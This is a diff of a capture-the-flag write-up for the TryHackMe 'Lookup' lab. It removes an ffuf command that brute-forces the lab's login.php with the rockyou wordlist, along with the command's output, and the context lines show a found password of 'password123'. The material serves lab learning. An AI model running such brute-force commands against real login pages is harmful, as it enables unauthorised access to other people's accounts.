@@ -142,34 +142,6 @@ password123             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 41m
 ```
 Jose has **password123** as password
 
-```
-[ Oguri ~ ]$ ffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=admin&password=FUZZ' -w /home/caffra/Wordlists/rockyou.txt  -t 10 -mc all -fs 62
-
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
-
-       v2.1.0-dev
-________________________________________________
-
- :: Method           : POST
- :: URL              : http://lookup.thm/login.php
- :: Wordlist         : FUZZ: /home/caffra/Wordlists/rockyou.txt
- :: Header           : Content-Type: application/x-www-form-urlencoded
- :: Data             : username=admin&password=FUZZ
- :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 10
- :: Matcher          : Response status: all
- :: Filter           : Response size: 62
-________________________________________________
-
-password123             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 44ms]
-```
 ## After Brute-force
 We can see website redirect to **http://files.lookup.thm** so its good idea to **add it to /etc/hosts**
 <img width="1877" height="381" alt="image" src="https://github.com/user-attachments/assets/6dd87315-dcf9-422e-8d3b-fa4a914f3506" />
